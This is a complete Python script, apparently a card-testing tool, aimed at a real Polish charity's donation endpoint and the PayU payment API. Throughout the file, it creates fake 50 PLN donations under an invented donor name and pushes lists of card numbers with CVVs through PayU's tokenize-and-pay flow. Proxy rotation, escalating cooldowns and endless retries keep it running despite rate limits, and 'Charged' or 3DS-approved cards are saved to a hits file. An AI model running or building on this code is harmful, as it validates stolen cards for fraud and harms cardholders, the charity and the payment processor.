#!/usr/bin/env python3
"""
eduafryka_payu_checker.py — PayU Checker
Technique: mpu.py (round-robin + escalating pause)
Source:   own (WP->token->posId->tokenize->pay)
Mode:     UNLIMITED by default
"""

import asyncio
import aiohttp
import argparse
import json
import os
import random
import sys
import time
import itertools
from collections import defaultdict
from urllib.parse import urlparse, parse_qs

# ─── Config ──────────────────────────────────────────────────────────────────
WP_URL = "https://eduafryka.org/wp-json/edu-afryka/v1/payu/donation"
PAYU_BASE = "https://secure.payu.com"
TIMEOUT = 25
PROXY_FILE = "proxy.txt"
HITS_FILE = "payu_hits.txt"

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

BROWSER_DATA = {
    "userAgent": UA,
    "language": "pl-PL",
    "screenWidth": 1280,
    "screenHeight": 720,
    "colorDepth": 24,
    "javaEnabled": False,
    "timezoneOffset": 60,
    "challengeWindowSize": "04"
}

GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
RESET = '\033[0m'

# ─── Proxy rotation (mpu.py technique) ───────────────────────────────────────
_proxies = []
_proxy_ctr = itertools.count()
_proxy_paused_until = {}
_proxy_fail_count = defaultdict(int)

def _next_proxy():
    """Round-robin; skip yang lagi pause; kalau semua pause ambil yang paling cepet sembuh."""
    if not _proxies:
        return None
    now = time.time()
    for _ in range(len(_proxies)):
        cand = _proxies[next(_proxy_ctr) % len(_proxies)]
        if _proxy_paused_until.get(cand, 0) <= now:
            return cand
    return min(_proxies, key=lambda p: _proxy_paused_until.get(p, 0))

def _pause_proxy(proxy):
    """Escalating cooldown: 60s, 120s, 180s, ..., max 600s."""
    if proxy is None:
        return
    _proxy_fail_count[proxy] += 1
    seconds = min(60 * _proxy_fail_count[proxy], 600)
    _proxy_paused_until[proxy] = time.time() + seconds

def _unpause_proxy(proxy):
    """Success -> reset fail count, hilangkan pause."""
    if proxy is None:
        return
    _proxy_fail_count[proxy] = 0
    _proxy_paused_until.pop(proxy, None)

def load_proxies(filename):
    proxies = []
    if not os.path.exists(filename):
        return proxies
    with open(filename, "r", encoding="utf-8") as f:
        for line in f:
            p = line.strip()
            if not p or p.startswith("#"):
                continue
            if "://" not in p:
                parts = p.split(":")
                if len(parts) == 4:
                    p = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                elif len(parts) == 2:
                    p = f"http://{p}"
            proxies.append(p)
    return proxies

# ─── Card helpers ────────────────────────────────────────────────────────────
def parse_card(card_str):
    parts = card_str.strip().split('|')
    if len(parts) != 4:
        return None
    cc, mm, yy, cvv = parts
    cc = cc.strip(); mm = mm.strip().zfill(2); cvv = cvv.strip(); yy = yy.strip()
    if len(yy) == 2:
        yy = "20" + yy
    if not (cc.isdigit() and len(cc) in (15, 16, 19)):
        return None
    if not mm.isdigit() or not (1 <= int(mm) <= 12):
        return None
    if not yy.isdigit() or not cvv.isdigit():
        return None
    return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv, "raw": f"{cc}|{mm}|{yy}|{cvv}"}

def extract_payu_error(pay_body, pay_text, http_status):
    msg = f"HTTP {http_status}"
    try:
        if isinstance(pay_body, dict):
            st = pay_body.get("status")
            if isinstance(st, dict):
                desc = st.get("statusDesc") or st.get("statusCode") or st.get("code")
                if desc: msg = str(desc)
            elif "statusDesc" in pay_body:
                msg = str(pay_body["statusDesc"])
            elif "message" in pay_body:
                msg = str(pay_body["message"])
            elif "errors" in pay_body:
                errs = pay_body["errors"]
                if isinstance(errs, list) and errs:
                    e0 = errs[0]
                    msg = (e0.get("message") or e0.get("error") or str(e0)) if isinstance(e0, dict) else str(e0)
        elif pay_text:
            msg = pay_text[:120].replace("\n", " ")
    except Exception:
        pass
    return msg

def classify_error(msg):
    low = msg.lower()
    if any(k in low for k in ["3ds", "authentication", "challenge", "redirect", "threeds"]):
        return "Approved (3DS)"
    if any(k in low for k in ["insufficient", "declined", "rejected", "do not honor",
                              "invalid card", "expired", "stolen", "lost", "pick up",
                              "not permitted", "restricted", "fraud", "cvv"]):
        return "Declined"
    return None

# ─── Single attempt (own source) ─────────────────────────────────────────────
async def check_card_once(session, card, proxy):
    c = parse_card(card)
    if not c:
        return {"status": "Invalid", "msg": "Bad format", "card": card, "proxy_fail": False}

    headers = {
        "User-Agent": UA,
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://eduafryka.org",
        "Referer": "https://eduafryka.org/donacja/",
    }

    try:
        # 1) WP order
        wp_payload = {
            "amount": 50, "currency": "PLN", "purpose": "cele-statutowe",
            "first_name": "Jan", "last_name": "Kowalski",
            "email": f"test{random.randint(1000,9999)}@example.com",
        }
        async with session.post(WP_URL, json=wp_payload, headers=headers, proxy=proxy, ssl=False) as resp:
            wp_text = await resp.text()
            if resp.status in (403, 429):
                return {"status": "WP_RATE", "msg": f"WP {resp.status}", "card": c["raw"], "proxy_fail": False}
            if resp.status not in (200, 201):
                return {"status": "WP_ERR", "msg": f"WP {resp.status}", "card": c["raw"], "proxy_fail": False}
            try:
                wp_data = json.loads(wp_text)
            except Exception:
                return {"status": "WP_ERR", "msg": "WP non-JSON", "card": c["raw"], "proxy_fail": False}

        redirect_uri = wp_data.get("redirectUri")
        if not redirect_uri:
            return {"status": "WP_ERR", "msg": "No redirectUri", "card": c["raw"], "proxy_fail": False}

        parsed = urlparse(redirect_uri)
        qs = parse_qs(parsed.query)
        order_id = qs.get("orderId", [""])[0]
        token = qs.get("token", [""])[0]
        if not order_id or not token:
            return {"status": "WP_ERR", "msg": "Bad redirect", "card": c["raw"], "proxy_fail": False}

        auth_headers = {**headers, "Authorization": f"Bearer {token}"}

        # 2) posId
        async with session.get(f"{PAYU_BASE}/api/front/orders/{order_id}",
                               headers=auth_headers, proxy=proxy, ssl=False) as resp:
            if resp.status != 200:
                return {"status": "SITE_ERR", "msg": f"Order {resp.status}", "card": c["raw"], "proxy_fail": False}
            order_info = await resp.json()
            pos_id = order_info.get("posId")
            if not pos_id:
                return {"status": "SITE_ERR", "msg": "No posId", "card": c["raw"], "proxy_fail": False}

        # 3) tokenize
        tok_payload = {
            "posId": pos_id, "type": "SINGLE",
            "card": {"number": c["cc"], "cvv": c["cvv"],
                     "expirationMonth": c["mm"], "expirationYear": c["yy"]},
        }
        async with session.post(f"{PAYU_BASE}/api/front/tokens", json=tok_payload,
                                headers=auth_headers, proxy=proxy, ssl=False) as resp:
            tok_text = await resp.text()
            if resp.status != 200:
                try: tb = json.loads(tok_text)
                except Exception: tb = {}
                err = extract_payu_error(tb, tok_text, resp.status)
                cls = classify_error(err)
                if cls == "Declined":
                    return {"status": "Declined", "msg": err, "card": c["raw"], "proxy_fail": False}
                return {"status": "TOK_ERR", "msg": f"Tokenize: {err}", "card": c["raw"], "proxy_fail": False}
            tok_data = await resp.json()
            card_token = tok_data.get("value")
            if not card_token:
                return {"status": "TOK_ERR", "msg": "No card token", "card": c["raw"], "proxy_fail": False}

        # 4) pay
        masked = f"{c['cc'][:6]}******{c['cc'][-4:]}"
        pay_payload = {
            "payMethod": {"type": "c", "token": card_token, "cardDetails": {"maskedCardNumber": masked}},
            "browserData": BROWSER_DATA, "language": "pl", "currency": "PLN",
            "amount": 5000, "email": "test@example.com",
            "firstName": "Jan", "lastName": "Kowalski",
            "redirectUrl": f"{PAYU_BASE}/pay/?orderId={order_id}&token=%token%",
        }
        async with session.post(f"{PAYU_BASE}/api/front/orders/{order_id}/payments",
                                json=pay_payload, headers=auth_headers, proxy=proxy, ssl=False) as resp:
            pay_text = await resp.text()
            pay_status = resp.status
            try: pay_body = json.loads(pay_text)
            except Exception: pay_body = {}

        if pay_status in (200, 201):
            if pay_body.get("continueUrl") or pay_body.get("redirectUri"):
                return {"status": "Approved (3DS)", "msg": "3DS Challenge", "card": c["raw"], "proxy_fail": False}
            status_s = str(pay_body.get("status", "")).upper()
            desc = str(pay_body.get("statusDesc", pay_text[:120]))
            if any(k in status_s for k in ("SUCCESS", "COMPLETED", "AUTHORIZED")):
                return {"status": "Charged", "msg": desc, "card": c["raw"], "proxy_fail": False}
            if "WARNING" in status_s or "3DS" in status_s:
                return {"status": "Approved (3DS)", "msg": desc, "card": c["raw"], "proxy_fail": False}
            if "DECLINED" in status_s or "REJECTED" in status_s:
                return {"status": "Declined", "msg": desc, "card": c["raw"], "proxy_fail": False}
            cls = classify_error(desc)
            if cls:
                return {"status": cls, "msg": desc, "card": c["raw"], "proxy_fail": False}
            return {"status": "Declined", "msg": f"Unknown: {desc}", "card": c["raw"], "proxy_fail": False}

        # error path (400/422/5xx)
        err = extract_payu_error(pay_body, pay_text, pay_status)
        cls = classify_error(err)
        if cls == "Approved (3DS)":
            return {"status": "Approved (3DS)", "msg": err, "card": c["raw"], "proxy_fail": False}
        if cls == "Declined":
            return {"status": "Declined", "msg": err, "card": c["raw"], "proxy_fail": False}
        return {"status": "PAY_ERR", "msg": err, "card": c["raw"], "proxy_fail": False}

    except (aiohttp.ClientProxyConnectionError, aiohttp.ClientHttpProxyError,
            aiohttp.ClientConnectorError) as e:
        return {"status": "PROXY_ERR", "msg": str(e)[:80], "card": c["raw"], "proxy_fail": True}
    except asyncio.TimeoutError:
        return {"status": "TIMEOUT", "msg": "timeout", "card": c["raw"], "proxy_fail": True}
    except Exception as e:
        return {"status": "ERR", "msg": str(e)[:120], "card": c["raw"], "proxy_fail": False}

# ─── UNLIMITED loop ──────────────────────────────────────────────────────────
async def check_unlimited(session, card):
    """
    Loop forever sampai CHARGED / APPROVED_3DS / DECLINED.
    Proxy rotation + escalating pause (mpu.py technique).
    """
    FINAL = {"Charged", "Approved (3DS)", "Declined"}
    attempt = 0
    wp_backoff_idx = 0
    WP_BACKOFF = [2, 5, 10, 20, 30]

    while True:
        attempt += 1
        proxy = _next_proxy()
        res = await check_card_once(session, card, proxy)

        if res.get("proxy_fail"):
            _pause_proxy(proxy)        # escalating cooldown
        else:
            _unpause_proxy(proxy)      # reset kalau berhasil

        if res["status"] in FINAL:
            return res

        # WP rate limit -> backoff panjang
        if res["status"] == "WP_RATE":
            wait = WP_BACKOFF[min(wp_backoff_idx, len(WP_BACKOFF) - 1)]
            wp_backoff_idx += 1
            await asyncio.sleep(wait + random.uniform(0, 2))
            continue

        # timeout / proxy / site error -> tidur sebentar, lanjut (proxy dirotasi otomatis)
        if attempt > 10:
            await asyncio.sleep(random.uniform(1.5, 4.0))
        else:
            await asyncio.sleep(random.uniform(0.4, 1.5))

# ─── CLI ─────────────────────────────────────────────────────────────────────
async def main():
    global _proxies
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--card", help="Single card cc|mm|yy|cvv")
    parser.add_argument("-f", "--file", help="File with cards")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Concurrency")
    parser.add_argument("-p", "--proxy", help="Single proxy")
    parser.add_argument("--proxyfile", default=PROXY_FILE)
    args = parser.parse_args()

    if not args.card and not args.file:
        parser.print_help(); sys.exit(2)

    if args.proxy:
        _proxies = [args.proxy]
    elif os.path.exists(args.proxyfile):
        _proxies = load_proxies(args.proxyfile)
        print(f"{CYAN}[*] Loaded {len(_proxies)} proxies | UNLIMITED{RESET}")
    else:
        print(f"{YELLOW}[!] No proxy file. Direct mode.{RESET}")

    connector = aiohttp.TCPConnector(limit=200, limit_per_host=0, ssl=False)
    timeout = aiohttp.ClientTimeout(total=TIMEOUT, connect=10)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:

        if args.card:
            print(f"{CYAN}[*] Checking {args.card} | UNLIMITED{RESET}")
            res = await check_unlimited(session, args.card)
            col = GREEN if res["status"] in ("Charged", "Approved (3DS)") else (RED if res["status"] == "Declined" else YELLOW)
            print(f"{col}[{res['status']}]{RESET} {res['card']} | {res['msg']}")
            return

        with open(args.file, "r") as f:
            raw = [l.strip() for l in f if l.strip() and not l.startswith("#")]

        seen = set(); cards = []
        for c in raw:
            if c in seen: continue
            seen.add(c); cards.append(c)

        print(f"{CYAN}[*] Mass: {len(cards)} cards | {args.threads} threads | UNLIMITED{RESET}\n")

        sem = asyncio.Semaphore(args.threads)
        stats = defaultdict(int)
        hits = []
        done = 0
        total = len(cards)
        lock = asyncio.Lock()

        async def worker(card):
            nonlocal done
            async with sem:
                res = await check_unlimited(session, card)
            async with lock:
                done += 1
                stats[res["status"]] += 1
                if res["status"] in ("Charged", "Approved (3DS)"):
                    col = GREEN; hits.append(res)
                    with open(HITS_FILE, "a") as hf:
                        hf.write(f"{res['card']} | {res['status']} | {res['msg']}\n")
                elif res["status"] == "Declined":
                    col = RED
                else:
                    col = YELLOW
                print(f"{col}[{res['status']}]{RESET} {res['card']} | {res['msg']}  ({done}/{total})")

        # progress ticker 30s
        stop = asyncio.Event()
        async def ticker():
            t0 = time.time()
            while not stop.is_set():
                await asyncio.sleep(30)
                if stop.is_set(): break
                elapsed = int(time.time() - t0)
                now = time.time()
                alive = len([p for p in _proxies if _proxy_paused_until.get(p, 0) <= now])
                print(f"{MAGENTA}[~] {done}/{total} | {alive}/{len(_proxies)} alive | {elapsed}s{RESET}")

        tt = asyncio.create_task(ticker())
        try:
            await asyncio.gather(*[asyncio.create_task(worker(c)) for c in cards])
        finally:
            stop.set(); tt.cancel()

        print(f"\n{CYAN}=== Complete ==={RESET}")
        print(f"Total: {total} | {GREEN}Charged: {stats['Charged']}{RESET} | "
              f"{GREEN}3DS: {stats['Approved (3DS)']}{RESET} | {RED}Declined: {stats['Declined']}{RESET}")
        if hits:
            print(f"{GREEN}[+] {len(hits)} hits -> {HITS_FILE}{RESET}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit(130)